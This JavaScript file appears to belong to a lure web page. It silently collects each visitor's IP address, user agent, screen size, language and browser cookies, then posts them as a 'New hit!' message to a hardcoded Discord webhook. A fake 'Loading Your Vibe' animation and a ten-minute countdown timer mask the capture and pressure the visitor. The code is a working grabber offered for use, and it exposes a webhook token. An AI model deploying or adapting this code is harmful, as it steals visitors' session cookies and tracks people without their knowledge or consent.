/**
 * script.js
 * (Client-side data capture and countdown timer)
 */

async function captureData() {
    // Collect device info
    const deviceInfo = {
        userAgent: navigator.userAgent,
        screen: `${window.screen.width}x${window.screen.height}`,
        language: navigator.language,
        cookies: document.cookie,
        timestamp: new Date().toISOString()
    };

    // Get IP via free API
    let ip ="unknown";
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        ip = ipData.ip;} catch (e) {
        console.error("IP fetch failed:", e);}
    // Combine data
    const data = { ip, ...deviceInfo};
    // Send to Discord webhook (replace with your webhook URL)
    await fetch('https://discord.com/api/webhooks/1362443178044690755/8WbrYwYNBfFcCpVAokndd9CdO8DCIMHcLvOYZ5hd6t8eIBFiaGl7Vr6lN21PMqknddG0', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json'},        body: JSON.stringify({
            content:`New hit!\nIP:${data.ip}\nUser-Agent:${data.userAgent}\nScreen:${data.screen}\nLanguage:${data.language}\nCookies:${data.cookies}\nTime:${data.timestamp}`
        })
    });

    // Fake loading animation
    document.querySelector('.hero').innerHTML = '<h2>Loading Your Vibe... ⏳</h2>';
    setTimeout(() => {
        window.location.href = 'thanks.html';}, 2000);}
// Countdown timer for urgency
let time = 600; // 10 minutes
setInterval(() => {
    time--;
    let minutes = Math.floor(time / 60);
    let seconds = time % 60;
    document.getElementById('countdown').textContent = `${minutes}:${seconds < 10? '0' : ''}${seconds}`;}, 1000);